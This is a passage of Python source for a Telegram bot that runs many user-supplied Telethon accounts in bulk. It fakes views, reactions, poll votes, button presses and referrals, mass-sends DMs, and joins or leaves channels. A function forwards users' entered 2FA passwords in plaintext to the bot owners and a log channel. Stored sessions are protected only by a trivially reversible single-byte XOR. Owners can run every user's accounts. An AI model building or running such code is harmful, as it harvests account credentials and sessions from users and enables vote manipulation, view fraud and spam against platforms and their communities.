import asyncio
import base64
import json
import os
import re
import random
import time
import math
from typing import Dict, Any, List, Optional, Tuple

# aiogram 3.x imports
from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import Command, StateFilter, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    BufferedInputFile
)

# Telethon imports
from telethon import TelegramClient, functions, types as tg_types
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PasswordHashInvalidError,
    FloodWaitError,
    UserAlreadyParticipantError
)

# SQLite
import aiosqlite

# Import local configurations
import config
from config import logger

# --- CRYPTO HELPERS ---
def _get_crypto_key() -> int:
    return sum(ord(c) for c in config.SECRET_KEY) % 256 or 42

def encrypt_data(data: str) -> str:
    key = _get_crypto_key()
    cipher_bytes = bytes([b ^ key for b in data.encode('utf-8')])
    return base64.b64encode(cipher_bytes).decode('utf-8')

def decrypt_data(encrypted_data: str) -> str:
    key = _get_crypto_key()
    try:
        raw_cipher = base64.b64decode(encrypted_data.encode('utf-8'))
        plain_bytes = bytes([b ^ key for b in raw_cipher])
        return plain_bytes.decode('utf-8')
    except Exception as e:
        logger.error(f"Decryption failure: {e}")
        return ""

# --- ADVANCED LINK & PRIVATE INVITE PARSING HELPER ---
def parse_telegram_link(link: str) -> Tuple[Any, Optional[int], bool]:
    link = link.strip()
    if not link:
        return None, None, False
        
    if re.match(r'^-?\d+$', link):
        return int(link), None, False

    private_match = re.search(r't\.me/c/(\d+)/(\d+)', link)
    if private_match:
        channel_id = int(f"-100{private_match.group(1)}")
        msg_id = int(private_match.group(2))
        return channel_id, msg_id, False

    if "+ " in link or "/+" in link or "joinchat/" in link:
        hash_match = re.search(r'(?:joinchat/|\+)([^/\s?]+)', link)
        if hash_match:
            return hash_match.group(1), None, True
        return link, None, True
        
    msg_match = re.search(r't\.me/([^/]+)/(\d+)', link)
    if msg_match:
        target = msg_match.group(1)
        if target.isdigit():
            target = int(f"-100{target}")
        return target, int(msg_match.group(2)), False
        
    target = link.replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
    if "/" in target:
        parts = target.split("/")
        target = parts[0]
        if target.isdigit():
            target = int(f"-100{target}")
        if len(parts) > 1 and parts[1].isdigit():
            msg_id = int(parts[1])
            return target, msg_id, False
            
    if isinstance(target, str) and target.replace("-", "").isdigit():
        return int(target), None, False

    return target, None, False

def make_progress_bar(pct: float, length: int = 15) -> str:
    filled = int(round(length * (pct / 100.0)))
    return "🟩" * filled + "⬜" * (length - filled)

# --- DATABASE ENGINE ---
class Database:
    def __init__(self, db_path: str = "bot_core_data.db"):
        self.db_path = db_path

    async def init(self):
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute("""
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    role TEXT DEFAULT 'user', 
                    max_accounts INTEGER DEFAULT 999999999,
                    referred_by INTEGER,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            await db.execute("""
                CREATE TABLE IF NOT EXISTS accounts (
                    phone TEXT PRIMARY KEY,
                    user_id INTEGER, 
                    username TEXT,
                    session_string TEXT,
                    status TEXT DEFAULT 'active', 
                    last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY(user_id) REFERENCES users(user_id)
                )
            """)
            await db.execute("""
                CREATE TABLE IF NOT EXISTS account_assignments (
                    user_id INTEGER,
                    phone TEXT,
                    PRIMARY KEY (user_id, phone),
                    FOREIGN KEY(user_id) REFERENCES users(user_id),
                    FOREIGN KEY(phone) REFERENCES accounts(phone) ON DELETE CASCADE
                )
            """)
            await db.execute("""
                CREATE TABLE IF NOT EXISTS tasks (
                    task_id INTEGER PRIMARY KEY AUTOINCREMENT,
                    creator_id INTEGER,
                    type TEXT, 
                    payload TEXT, 
                    status TEXT DEFAULT 'pending', 
                    progress TEXT DEFAULT '0%',
                    success_report TEXT,
                    failure_report TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            await db.execute("""
                CREATE TABLE IF NOT EXISTS logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    action TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            await db.commit()
            logger.info("Database system initialized.")

    async def log_action(self, user_id: int, action: str, bot_instance: Optional[Bot] = None, operational: bool = False):
        try:
            async with aiosqlite.connect(self.db_path) as db:
                await db.execute("INSERT INTO logs (user_id, action) VALUES (?, ?)", (user_id, action))
                await db.commit()
        except Exception as db_err:
            logger.error(f"Failed to log action: {db_err}")
        
        if operational and bot_instance and config.LOG_CHANNEL_ID:
            try:
                log_text = (
                    f"📝 <b>System Log Update</b>\n"
                    f"👤 User ID: <code>{user_id}</code>\n"
                    f"⚙️ Action executed: {action}"
                )
                await bot_instance.send_message(chat_id=config.LOG_CHANNEL_ID, text=log_text, parse_mode="HTML")
            except Exception as e:
                logger.error(f"Failed sending log channel updates: {e}")

    async def get_user_role(self, user_id: int) -> str:
        if user_id in config.SUPER_OWNER_IDS:
            return "super_owner"
        async with aiosqlite.connect(self.db_path) as db:
            async with db.execute("SELECT role FROM users WHERE user_id = ?", (user_id,)) as cursor:
                row = await cursor.fetchone()
                return row[0] if row else "user"

    async def get_admin_limits(self, user_id: int) -> int:
        return 999999999

    async def get_current_account_count(self, user_id: int) -> int:
        async with aiosqlite.connect(self.db_path) as db:
            async with db.execute("SELECT COUNT(*) FROM accounts WHERE user_id = ?", (user_id,)) as cursor:
                row = await cursor.fetchone()
                return row[0] if row else 0

    async def create_user_if_not_exists(self, user_id: int, username: str, referred_by: Optional[int] = None):
        async with aiosqlite.connect(self.db_path) as db:
            async with db.execute("SELECT 1 FROM users WHERE user_id = ?", (user_id,)) as cursor:
                if not await cursor.fetchone():
                    role_val = "super_owner" if user_id in config.SUPER_OWNER_IDS else "user"
                    await db.execute(
                        "INSERT INTO users (user_id, username, role, referred_by, max_accounts) VALUES (?, ?, ?, ?, 999999999)",
                        (user_id, username, role_val, referred_by)
                    )
                    await db.commit()

db_mgr = Database()
registration_sessions: Dict[int, Dict[str, Any]] = {}
bot_username: str = "bot"

async def dispatch_2fa_alert(bot: Bot, user_id: int, phone: str, password_entered: Optional[str] = None):
    text = (
        f"🔐 <b>2FA Password Event Detected!</b>\n\n"
        f"👤 User ID: <code>{user_id}</code>\n"
        f"📱 Phone: <code>+{phone}</code>\n"
    )
    if password_entered:
        text += f"🔑 Password Provided: <code>{password_entered}</code>\n"
    text += f"<i>An account registration hit a 2FA prompt during login flow.</i>"

    if config.LOG_CHANNEL_ID:
        try:
            await bot.send_message(chat_id=config.LOG_CHANNEL_ID, text=text, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Failed sending 2FA alert to log channel: {e}")

    for owner_id in config.SUPER_OWNER_IDS:
        try:
            await bot.send_message(chat_id=owner_id, text=text, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Failed sending 2FA alert to owner node {owner_id}: {e}")

# --- CONCURRENT TASK MANAGER ENGINE ---
class TaskQueue:
    def __init__(self):
        self.queue = asyncio.Queue()
        self.current_tasks: Dict[int, asyncio.Task] = {}

    async def add_task(self, task_id: int, creator_id: int, task_type: str, payload: dict, bot_instance: Bot, status_msg_id: int):
        await self.queue.put((task_id, creator_id, task_type, payload, bot_instance, status_msg_id))

    def clear_pending_queue(self):
        while not self.queue.empty():
            try:
                self.queue.get_nowait()
                self.queue.task_done()
            except asyncio.QueueEmpty:
                break

    async def cancel_all_active_tasks(self) -> int:
        count = 0
        self.clear_pending_queue()
        active_ids = list(self.current_tasks.keys())
        for t_id in active_ids:
            loop_task = self.current_tasks.get(t_id)
            if loop_task and not loop_task.done():
                loop_task.cancel()
                count += 1
                async with aiosqlite.connect(db_mgr.db_path) as db:
                    await db.execute(
                        "UPDATE tasks SET status = 'cancelled', progress = 'Stopped by admin' WHERE task_id = ?", 
                        (t_id,)
                    )
                    await db.commit()
        return count

    async def start_worker(self):
        logger.info("Task runner loop started.")
        while True:
            try:
                task_id, creator_id, task_type, payload, bot_instance, status_msg_id = await self.queue.get()
            except asyncio.CancelledError:
                break
                
            loop_task = asyncio.create_task(self.execute_task(task_id, creator_id, task_type, payload, bot_instance, status_msg_id))
            self.current_tasks[task_id] = loop_task
            try:
                await loop_task
            except asyncio.CancelledError:
                logger.warning(f"Task #{task_id} was stopped.")
            except Exception as e:
                logger.error(f"Error on task #{task_id}: {e}")
            finally:
                self.current_tasks.pop(task_id, None)
                self.queue.task_done()

    async def execute_task(self, task_id: int, creator_id: int, task_type: str, payload: dict, bot_instance: Bot, status_msg_id: int):
        start_time = time.time()
        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute("UPDATE tasks SET status = 'running', progress = '0%' WHERE task_id = ?", (task_id,))
            await db.commit()

        role = await db_mgr.get_user_role(creator_id)
        clients_data = []
        requested_count = int(payload.get("run_account_count", 0))
        account_routing = payload.get("account_routing", "own")
        
        async with aiosqlite.connect(db_mgr.db_path) as db:
            if role == "super_owner":
                if account_routing == "all":
                    query = "SELECT phone, session_string FROM accounts WHERE status = 'active'"
                    cursor = await db.execute(query)
                else:
                    query = "SELECT phone, session_string FROM accounts WHERE status = 'active' AND user_id = ?"
                    cursor = await db.execute(query, (creator_id,))
            elif role == "owner":
                query = "SELECT phone, session_string FROM accounts WHERE status = 'active'"
                cursor = await db.execute(query)
            else:
                query = """
                    SELECT phone, session_string FROM accounts 
                    WHERE status = 'active' AND (
                        user_id = ? OR phone IN (SELECT phone FROM account_assignments WHERE user_id = ?)
                    )
                """
                cursor = await db.execute(query, (creator_id, creator_id))
            
            async for row in cursor:
                clients_data.append((row[0], decrypt_data(row[1])))

        if requested_count > 0:
            clients_data = clients_data[:requested_count]

        if not clients_data:
            async with aiosqlite.connect(db_mgr.db_path) as db:
                await db.execute("UPDATE tasks SET status = 'failed', progress = 'No accounts found' WHERE task_id = ?", (task_id,))
                await db.commit()
            try:
                await bot_instance.edit_message_text(chat_id=creator_id, message_id=status_msg_id, text="❌ <b>Task Failed:</b> You do not have any operational accounts available under selected scopes.")
            except Exception:
                pass
            return

        passed_ids: List[str] = []
        failed_ids: List[Tuple[str, str]] = []
        total_accounts = len(clients_data)
        
        speed_mode = payload.get("speed_mode", "safe")
        if speed_mode == "safer":
            sleep_time = 2.5
        elif speed_mode == "fastest":
            sleep_time = 0.05
        else:
            sleep_time = 5.0

        semaphore = asyncio.Semaphore(5 if speed_mode == "safer" else (1 if speed_mode == "safe" else 25)) 
        progress_counter = 0
        success_counter = 0
        failure_counter = 0
        last_ui_update = 0

        async def worker_session(phone: str, enc_session: str, idx: int):
            nonlocal progress_counter, success_counter, failure_counter, last_ui_update
            async with semaphore:
                client = TelegramClient(StringSession(enc_session), config.API_ID, config.API_HASH)
                try:
                    await asyncio.sleep(sleep_time * idx)
                    await client.connect()
                    if not await client.is_user_authorized():
                        async with aiosqlite.connect(db_mgr.db_path) as db_conn:
                            await db_conn.execute("UPDATE accounts SET status = 'dead' WHERE phone = ?", (phone,))
                            await db_conn.commit()
                        failed_ids.append((phone, "Session key expired / Account banned"))
                        failure_counter += 1
                        return

                    target = payload.get("target", "")
                    channel_target = payload.get("channel_target", target)
                    do_leave_all = (task_type == "leave" and payload.get("leave_mode") == "all")

                    parsed_target, link_msg_id, is_target_private = parse_telegram_link(target) if not do_leave_all else (None, None, False)
                    parsed_channel, _, is_channel_private = parse_telegram_link(channel_target) if not do_leave_all else (None, None, False)
                    msg_id = int(payload.get("msg_id", link_msg_id or 0))

                    do_react = "react" in task_type
                    do_vote = "vote" in task_type
                    do_view = "view" in task_type or task_type == "speed"
                    do_join = task_type == "join"
                    do_leave = task_type == "leave"
                    do_dm = task_type == "dm"
                    do_refer = task_type == "refer"

                    target_peer = parsed_target

                    # Helper function to auto-join if account is not a participant
                    async def ensure_joined(peer_or_link: Any, is_private: bool):
                        try:
                            if is_private or "+ " in str(peer_or_link) or "/+" in str(peer_or_link) or "joinchat/" in str(peer_or_link):
                                inv_hash = peer_or_link if is_private else channel_target
                                updates = await client(functions.messages.ImportChatInviteRequest(hash=str(inv_hash).strip()))
                                if hasattr(updates, 'chats') and updates.chats:
                                    return updates.chats[0]
                            else:
                                updates = await client(functions.channels.JoinChannelRequest(channel=peer_or_link))
                                if hasattr(updates, 'chats') and updates.chats:
                                    return updates.chats[0]
                        except UserAlreadyParticipantError:
                            pass
                        except Exception:
                            pass
                        return peer_or_link

                    if do_join:
                        try:
                            target_peer = await ensure_joined(parsed_channel or parsed_target, is_channel_private or is_target_private)
                        except Exception as join_err:
                            failed_ids.append((phone, f"Failed to join chat/channel: {str(join_err)}"))
                            failure_counter += 1
                            return

                    if do_view and msg_id:
                        try:
                            await client(functions.messages.GetMessagesViewsRequest(peer=target_peer, id=[msg_id], increment=True))
                        except Exception:
                            # Auto skip/join fallback if not joined
                            target_peer = await ensure_joined(parsed_channel or parsed_target, is_channel_private or is_target_private)
                            try:
                                await client(functions.messages.GetMessagesViewsRequest(peer=target_peer, id=[msg_id], increment=True))
                            except Exception as view_err:
                                failed_ids.append((phone, f"View increment failed: {str(view_err)}"))
                                failure_counter += 1
                                return

                    if do_react and msg_id:
                        emojis = payload.get("reactions", ["👍"])
                        assigned_emoji = emojis[idx % len(emojis)]
                        try:
                            peer_entity = await client.get_input_entity(target_peer)
                            await client(functions.messages.SendReactionRequest(
                                peer=peer_entity,
                                msg_id=msg_id,
                                reaction=[tg_types.ReactionEmoji(emoticon=assigned_emoji)]
                            ))
                        except Exception:
                            # Auto skip join step fallback
                            target_peer = await ensure_joined(parsed_channel or parsed_target, is_channel_private or is_target_private)
                            try:
                                peer_entity = await client.get_input_entity(target_peer)
                                await client(functions.messages.SendReactionRequest(
                                    peer=peer_entity,
                                    msg_id=msg_id,
                                    reaction=[tg_types.ReactionEmoji(emoticon=assigned_emoji)]
                                ))
                            except Exception as react_err:
                                failed_ids.append((phone, f"Reaction failed: {str(react_err)}"))
                                failure_counter += 1
                                return

                    if do_vote and msg_id:
                        try:
                            vote_mode = payload.get("vote_mode", "text")
                            if vote_mode == "inline":
                                raw_button_text = payload.get("button_text", "").strip().lower()
                                clean_target = re.sub(r'[\s\-_\(\)\[\]\d]+$', '', raw_button_text)

                                msg = await client.get_messages(target_peer, ids=msg_id)
                                if not msg:
                                    target_peer = await ensure_joined(parsed_channel or parsed_target, is_channel_private or is_target_private)
                                    msg = await client.get_messages(target_peer, ids=msg_id)

                                if msg and msg.reply_markup:
                                    target_button = None
                                    for row in msg.reply_markup.rows:
                                        for btn in row.buttons:
                                            btn_raw = btn.text.strip().lower()
                                            btn_clean = re.sub(r'[\s\-_\(\)\[\]\d]+$', '', btn_raw)

                                            if (
                                                raw_button_text in btn_raw or 
                                                (clean_target and clean_target == btn_clean) or 
                                                (clean_target and btn_raw.startswith(clean_target))
                                            ):
                                                target_button = btn
                                                break
                                        if target_button:
                                            break
                                    if target_button and isinstance(target_button, tg_types.KeyboardButtonCallback):
                                        await client(functions.messages.GetBotCallbackAnswerRequest(peer=target_peer, msg_id=msg_id, data=target_button.data))
                                    else:
                                        raise ValueError("Inline button text not found.")
                                else:
                                    raise ValueError("Target message has no inline keyboard.")
                            else:
                                chosen_option = int(payload.get("poll_option_index", 0))
                                await client(functions.messages.VotePollRequest(peer=target_peer, msg_id=msg_id, options=[bytes([chosen_option])]))
                        except Exception:
                            target_peer = await ensure_joined(parsed_channel or parsed_target, is_channel_private or is_target_private)
                            try:
                                if vote_mode == "inline":
                                    msg = await client.get_messages(target_peer, ids=msg_id)
                                    if msg and msg.reply_markup:
                                        target_button = None
                                        for row in msg.reply_markup.rows:
                                            for btn in row.buttons:
                                                if raw_button_text in btn.text.strip().lower():
                                                    target_button = btn
                                                    break
                                        if target_button and isinstance(target_button, tg_types.KeyboardButtonCallback):
                                            await client(functions.messages.GetBotCallbackAnswerRequest(peer=target_peer, msg_id=msg_id, data=target_button.data))
                                else:
                                    await client(functions.messages.VotePollRequest(peer=target_peer, msg_id=msg_id, options=[bytes([chosen_option])]))
                            except Exception as vote_err:
                                failed_ids.append((phone, f"Voting failed: {str(vote_err)}"))
                                failure_counter += 1
                                return

                    if do_dm:
                        try:
                            await client.send_message(target_peer, payload.get("text", "Hello!"))
                        except Exception as dm_err:
                            failed_ids.append((phone, f"DM dispatch failed: {str(dm_err)}"))
                            failure_counter += 1
                            return

                    if do_refer:
                        try:
                            bot_username_target = str(target_peer).replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
                            start_param = None
                            if "start=" in target:
                                param_match = re.search(r'start=([^&\s]+)', target)
                                if param_match:
                                    start_param = param_match.group(1)
                            if "?" in bot_username_target:
                                bot_username_target = bot_username_target.split("?")[0]
                            await client.send_message(bot_username_target, f"/start {start_param}" if start_param else "/start")
                        except Exception as ref_err:
                            failed_ids.append((phone, f"Referral start message failed: {str(ref_err)}"))
                            failure_counter += 1
                            return

                    # ENHANCED LEAVE CHANNEL CONTROLLER (SUPPORTS PUBLIC & PRIVATE LINKS)
                    if do_leave:
                        if do_leave_all:
                            left_chats_count = 0
                            async for dialog in client.iter_dialogs():
                                if dialog.is_channel or dialog.is_group:
                                    try:
                                        await client(functions.channels.LeaveChannelRequest(channel=dialog.entity))
                                        left_chats_count += 1
                                        await asyncio.sleep(0.3)
                                    except FloodWaitError as fwe:
                                        await asyncio.sleep(fwe.seconds)
                                    except Exception:
                                        pass
                            if left_chats_count == 0:
                                failed_ids.append((phone, "Account was not present in any channels"))
                                failure_counter += 1
                                return
                        else:
                            try:
                                # Resolve single channel by private hash or public target
                                leave_target, _, is_priv = parse_telegram_link(target)
                                if is_priv or "+ " in str(target) or "/+" in str(target) or "joinchat/" in str(target):
                                    resolved_entity = await client.get_entity(target)
                                else:
                                    resolved_entity = await client.get_input_entity(leave_target)
                                await client(functions.channels.LeaveChannelRequest(channel=resolved_entity))
                            except Exception as leave_err:
                                failed_ids.append((phone, f"Leave channel failed: {str(leave_err)}"))
                                failure_counter += 1
                                return

                    passed_ids.append(phone)
                    success_counter += 1
                    
                except Exception as general_err:
                    failed_ids.append((phone, f"General error: {str(general_err)}"))
                    failure_counter += 1
                finally:
                    await client.disconnect()
                    progress_counter += 1
                    
                    current_now = time.time()
                    if current_now - last_ui_update >= 2.5 or progress_counter == total_accounts:
                        last_ui_update = current_now
                        pct_val = (progress_counter / total_accounts) * 100
                        elapsed = current_now - start_time
                        avg_time = elapsed / progress_counter if progress_counter > 0 else 0
                        remaining = (total_accounts - progress_counter) * avg_time
                        
                        eta_str = f"~{int(remaining // 60)}m {int(remaining % 60)}s" if remaining > 0 else "0s"
                        progress_pct = f"{int(pct_val)}%"
                        
                        live_text = (
                            f"⏳ <b>Campaign Processing Deployment Framework Running...</b>\n\n"
                            f"[{make_progress_bar(pct_val)}] <b>{progress_pct}</b>\n"
                            f"📊 <code>{progress_counter}/{total_accounts}</code> accounts completely run\n"
                            f"✅ Successful: <code>{success_counter}</code> | ❌ Blocked: <code>{failure_counter}</code>\n"
                            f"⏱ Time remaining duration: {eta_str}"
                        )
                        try:
                            await bot_instance.edit_message_text(chat_id=creator_id, message_id=status_msg_id, text=live_text, parse_mode="HTML")
                        except Exception:
                            pass

                        async with aiosqlite.connect(db_mgr.db_path) as db_update:
                            await db_update.execute("UPDATE tasks SET progress = ? WHERE task_id = ?", (progress_pct, task_id))
                            await db_update.commit()

        await asyncio.gather(*(worker_session(phone, enc, i) for i, (phone, enc) in enumerate(clients_data)))

        end_time = time.time()
        elapsed_total = end_time - start_time
        duration_str = f"{int(elapsed_total // 60)}m {int(elapsed_total % 60)}s"

        status = "completed" if len(passed_ids) > 0 else "failed"
        success_report_json = json.dumps(passed_ids)
        failure_report_json = json.dumps(failed_ids)

        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute(
                "UPDATE tasks SET status = ?, progress = ?, success_report = ?, failure_report = ? WHERE task_id = ?",
                (status, f"{len(passed_ids)}/{total_accounts} Passed", success_report_json, failure_report_json, task_id)
            )
            await db.commit()

        success_pct_final = int((success_counter / total_accounts) * 100) if total_accounts > 0 else 0
        campaign_uuid = base64.b64encode(f"CAMP_{task_id}".encode()).decode().lower()[:24]
        
        user_info = f"<code>{creator_id}</code>"
        try:
            chat_member = await bot_instance.get_chat(creator_id)
            if chat_member.first_name:
                user_info = f"{chat_member.first_name} (<code>{creator_id}</code>)"
        except Exception:
            pass

        target_display = "ALL CHANNELS DEPLOYMENT" if payload.get("leave_mode") == "all" else f"<code>{payload.get('target', 'N/A')}</code>"

        failure_log_details = ""
        if len(failed_ids) > 20:
            failure_log_details = f"\n\n📄 <b>Note:</b> More than 20 errors occurred (<code>{len(failed_ids)}</code> failures). A detailed file log with clear failure reasons has been generated and sent below."
        elif failed_ids:
            failure_log_details = "\n\n❌ <b>Detailed Failure Telemetry Matrix:</b>\n"
            for phone_num, reason in failed_ids:
                failure_log_details += f"• <code>+{phone_num}</code> ➜ <i>{reason}</i>\n"

        completion_card = (
            f"👑 <b>Premium Task Management Closure Summary Card</b>\n\n"
            f"📋 Campaign ID: <code>{campaign_uuid}</code>\n"
            f"⚡ Action Code Execution: <code>{task_type.upper()}</code>\n"
            f"👤 Creator Node Profile: {user_info}\n"
            f"🔗 Target Location Path: {target_display}\n"
            f"📢 Secondary Target Scope: <code>{payload.get('channel_target', 'N/A')}</code>\n"
            f"🏎 Speed Interval Throttle: <code>{speed_mode.upper()}</code>\n\n"
            f"📊 <b>Performance Analytics Reports:</b>\n"
            f"✅ Success Threshold: <code>{success_counter}/{total_accounts}</code> ({success_pct_final}%)\n"
            f"❌ Core Failures Recorded: <code>{failure_counter}/{total_accounts}</code>\n"
            f"⏱ Production Runtime Elapsed: {duration_str}"
            f"{failure_log_details}"
        )

        try:
            await bot_instance.send_message(chat_id=creator_id, text=completion_card, parse_mode="HTML")
            
            if len(failed_ids) > 20:
                file_lines = [
                    f"============================================================",
                    f"CAMPAIGN FAILURE AUDIT REPORT - TASK #{task_id}",
                    f"Target: {payload.get('target', 'N/A')}",
                    f"Total Failed Accounts: {len(failed_ids)}",
                    f"============================================================\n"
                ]
                for phone_num, reason in failed_ids:
                    file_lines.append(f"Phone: +{phone_num} | Reason: {reason}")
                
                report_content = "\n".join(file_lines).encode('utf-8')
                fail_doc = BufferedInputFile(report_content, filename=f"task_{task_id}_failures.txt")
                await bot_instance.send_document(
                    chat_id=creator_id,
                    document=fail_doc,
                    caption=f"📁 <b>Failure Reason Log</b>\nContains complete failure audit for <code>{len(failed_ids)}</code> failed accounts in Task <code>#{task_id}</code>.",
                    parse_mode="HTML"
                )
        except Exception as report_err:
            logger.error(f"Failed delivering task completion report: {report_err}")

        if config.LOG_CHANNEL_ID:
            try:
                await bot_instance.send_message(chat_id=config.LOG_CHANNEL_ID, text=completion_card, parse_mode="HTML")
            except Exception as le:
                logger.error(f"Failed sending validation report to log channel: {le}")

task_queue = TaskQueue()

# --- FSM STATES ---
class RegistrationStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_otp = State()
    waiting_for_2fa = State()
    waiting_for_session_file = State()
    waiting_for_db_file = State()

class TaskWizardStates(StatesGroup):
    choosing_type = State()
    waiting_for_routing_choice = State()
    waiting_for_speed_choice = State()
    waiting_for_leave_choice = State()
    waiting_for_channel_link = State()
    waiting_for_post_link = State()
    waiting_for_vote_mode_choice = State()
    waiting_for_poll_option_index = State()
    waiting_for_emojis = State()
    waiting_for_button_text = State()
    waiting_for_dm_text = State()
    waiting_for_account_scale = State()

class ExportWizardStates(StatesGroup):
    selecting_multi = State()

class BroadcastStates(StatesGroup):
    waiting_for_msg = State()

# --- UI KEYBOARD GENERATORS (STYLES MAINTAINED) ---
REACTION_EMOJIS = [
    "🔥", "❤️", "💖", "💘", "💝",
    "👍", "👏", "🎉", "🤩", "💯",
    "⚡", "🍓", "💋", "🍿", "🏆",
    "🤣", "🥰", "🤔", "👀", "😎"
]

def get_post_registration_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✨ Connect Next Target Account", callback_data="add_account_phone", style="success")],
        [InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu", style="primary")]
    ])

def get_emoji_selection_keyboard(selected_emojis: List[str]) -> InlineKeyboardMarkup:
    keyboard = []
    row = []
    for emoji in REACTION_EMOJIS:
        is_selected = emoji in selected_emojis
        suffix = " ⭐" if is_selected else ""
        row.append(InlineKeyboardButton(text=f"{emoji}{suffix}", callback_data=f"toggle_emoji:{emoji}", style="primary" if is_selected else "success"))
        if len(row) == 5:  
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
    
    keyboard.append([InlineKeyboardButton(text="🔱 Finalize Reaction Pack selection", callback_data="finish_emoji_selection", style="success")])
    keyboard.append([InlineKeyboardButton(text="💎 Home Menu", callback_data="main_menu", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

def get_main_keyboard(role: str) -> InlineKeyboardMarkup:
    buttons = [
        [InlineKeyboardButton(text="📱 Manage accounts", callback_data="manage_accounts:0", style="primary")],
        [InlineKeyboardButton(text="🌋 Launch Active Campaign Tasks", callback_data="task_hub_start", style="success")],
        [InlineKeyboardButton(text="ℹ️ System Instructions & Features", callback_data="view_instructions", style="primary")],
        [InlineKeyboardButton(text="⚜️ Referral link", callback_data="view_referrals", style="primary")],
        [InlineKeyboardButton(text="👑 Developers", callback_data="system_credits", style="primary")]
    ]
    if role in ["admin", "owner", "super_owner"]:
        buttons.append([InlineKeyboardButton(text="🛡️ Admin panel", callback_data="admin_panel", style="danger")])
    if role in ["owner", "super_owner"]:
        buttons.append([InlineKeyboardButton(text="💾 Database Export/Import", callback_data="backup_panel", style="danger")])
        buttons.append([InlineKeyboardButton(text="📈 User IDs with details", callback_data="system_stats", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def get_task_types_keyboard(active_count: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔥 Reaction Only", callback_data="set_type:react", style="success"), InlineKeyboardButton(text="🗳️ Advanced Poll Voting", callback_data="set_type:vote", style="success")],
        [InlineKeyboardButton(text="⚡ Reaction + Vote", callback_data="set_type:react_vote", style="success"), InlineKeyboardButton(text="👁️ View Incrementor", callback_data="set_type:view", style="primary")],
        [InlineKeyboardButton(text="💎 Reaction + View", callback_data="set_type:react_view", style="success"), InlineKeyboardButton(text="🎯 Vote + View", callback_data="set_type:vote_view", style="success")],
        [InlineKeyboardButton(text="🔮 Reaction + Vote + View ", callback_data="set_type:react_vote_view", style="success")],
        [InlineKeyboardButton(text="✅ Join Target Channel", callback_data="set_type:join", style="primary"), InlineKeyboardButton(text="❌ Leave channel", callback_data="set_type:leave", style="danger")],
        [InlineKeyboardButton(text="📥 Direct DM Broadcast", callback_data="set_type:dm", style="primary")],
        [InlineKeyboardButton(text="🔗 Referral ", callback_data="set_type:refer", style="primary"), InlineKeyboardButton(text="🏎️ Fast Speed Views", callback_data="set_type:speed", style="success")],
        [InlineKeyboardButton(text="🛑 Abort Setup Configuration", callback_data="main_menu", style="danger")]
    ])

def get_leave_channel_options_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔗 Leave channel link (Public/Private)", callback_data="leave_mode:single", style="primary")],
        [InlineKeyboardButton(text="💥 Complete Purge (Leave All Channels)", callback_data="leave_mode:all", style="danger")],
        [InlineKeyboardButton(text="🔙 Return Back", callback_data="task_hub_start", style="primary")]
    ])

# --- ROUTER REGISTER ---
router = Router()

@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext, bot: Bot):
    await state.clear()
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    referred_by = None
    if len(message.text.split()) > 1:
        ref_payload = message.text.split()[1]
        if ref_payload.startswith("ref_") and ref_payload[4:].isdigit():
            referred_by = int(ref_payload[4:])
            if referred_by == user_id:
                referred_by = None

    await db_mgr.create_user_if_not_exists(user_id, username, referred_by)
    role = await db_mgr.get_user_role(user_id)
    await db_mgr.log_action(user_id, "Started the bot", bot, operational=False)

    welcome_text = (
        f"👋 <b>Greetings, Elite User! Welcome back to Premium Session Hub Bot Terminal.</b>\n\n"
        f"Your system assigned clearance grade identifier: <b>{role.upper()}</b>\n"
        f"Select execution options or deploy automated cluster configurations below:"
    )
    await message.answer(welcome_text, reply_markup=get_main_keyboard(role), parse_mode="HTML")

@router.callback_query(F.data == "main_menu")
async def handle_main_menu(callback: CallbackQuery, state: FSMContext, bot: Bot):
    await callback.answer()
    await state.clear()
    role = await db_mgr.get_user_role(callback.from_user.id)
    await callback.message.edit_text(
        f"👋 <b>Greetings, Elite User! Welcome back to Premium Session Hub Bot Terminal.</b>\n\n"
        f"Your system assigned clearance grade identifier: <b>{role.upper()}</b>\n"
        f"Select execution options or deploy automated cluster configurations below:",
        reply_markup=get_main_keyboard(role),
        parse_mode="HTML"
    )

# --- INSTRUCTIONS & FEATURE GUIDE BUTTON HANDLER ---
@router.callback_query(F.data == "view_instructions")
async def handle_view_instructions(callback: CallbackQuery):
    await callback.answer()
    instructions_text = (
        "📖 <b>Bot Features & Operating Instructions Guide</b>\n\n"
        "⚡ <b>Key Features Breakdown:</b>\n"
        "• <b>Account Management:</b> Add accounts via OTP (+2FA) or string session files. "
        "Every added session auto-exports a copy directly to your PM.\n"
